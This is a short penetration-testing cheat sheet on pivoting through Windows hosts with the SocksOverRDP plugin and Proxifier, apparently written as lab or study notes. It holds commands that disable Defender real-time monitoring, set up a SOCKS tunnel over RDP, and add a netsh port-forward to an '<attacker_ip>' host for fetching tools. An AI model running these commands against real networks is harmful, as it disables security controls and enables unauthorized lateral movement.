# SocksOverRDP

#### Binaries

* https://github.com/nccgroup/SocksOverRDP/releases
* https://www.proxifier.com/download/#win-tab

#### Setup

* Copy SocksOverRDP.zip to target and unzip
* Loading SocksOverRDP.dll using regsvr32.exe
* As Admin & Disable Realtime Protection

```
Set-MpPreference -DisableRealtimeMonitoring $true
regsvr32.exe SocksOverRDP-Plugin.dll
```

#### Run RDP and Enter Target IP

```
mstsc.exe
```

* Will get prompt - enter creds
* Transfer SocksOverRDP-Server.exe to target

#### Confirming the SOCKS Listener is Started on Pivot

```
netstat -antb | findstr 1080
```

#### Transfer Proxifier to Pivot Host

* Configure Proxifier

```
Profile > Proxy Server > Add
127.0.0.1 1080 Socks5
```

---

### Complete Walkthrough

```
# On first Windows pivot host:
regsvr32.exe SocksOverRDP-Plugin.dll
# RDP to second host — you'll get a SocksOverRDP popup
mstsc.exe

# On second host (the one you RDP'd into):
# Transfer and run SocksOverRDP-Server.exe with admin privs
.\SocksOverRDP-Server.exe
# Verify:
netstat -ano | findstr 1080

# On first pivot host, use Proxifier with 127.0.0.1:1080 SOCKS
# Set up port forward to get tools from attacker:
netsh.exe interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=8000 connectaddress=<attacker_ip>
```

---

### Multi-Hop RDP

After Proxifier is configured, use `mstsc.exe` to RDP to deeper internal targets through the SOCKS tunnel chain.

### Performance Tip

Set mstsc.exe Experience tab Performance to **Modem** for slow tunneled connections to reduce bandwidth overhead.
